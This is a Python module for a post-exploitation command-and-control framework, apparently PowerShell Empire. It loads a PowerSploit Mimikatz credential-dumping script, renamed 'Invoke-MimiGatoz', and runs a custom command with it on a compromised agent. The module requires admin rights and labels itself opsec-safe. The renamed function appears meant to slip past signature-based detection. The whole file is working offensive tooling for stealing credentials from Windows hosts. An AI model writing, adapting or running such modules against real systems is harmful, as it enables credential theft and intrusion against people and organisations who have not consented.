from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-MimiGatoz Command',

            'Author': ['@JosephBialek', '@gentilkiwi'],

            'Description': ("Runs PowerSploit's Invoke-MimiGatoz function "
                            "with a custom command."),

            'Background' : True,

            'OutputExtension' : None,
            
            'NeedsAdmin' : True,

            'OpsecSafe' : True,

            'MinPSVersion' : '2',
            
            'Comments': [
                'http://clymb3r.wordpress.com/',
                'http://blog.gentilkiwi.com'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Command' : {
                'Description'   :   'Custom Invoke-MimiGatoz command to run.',
                'Required'      :   True,
                'Value'         :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu
        
        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self):
        
        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "data/module_source/credentials/Invoke-MimiGatoz.ps1"

        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode

        # build the custom command with whatever options we want
        script += "Invoke-MimiGatoz -Command "
        script += "'\"" + self.options['Command']['Value'] + "\"'"

        return script
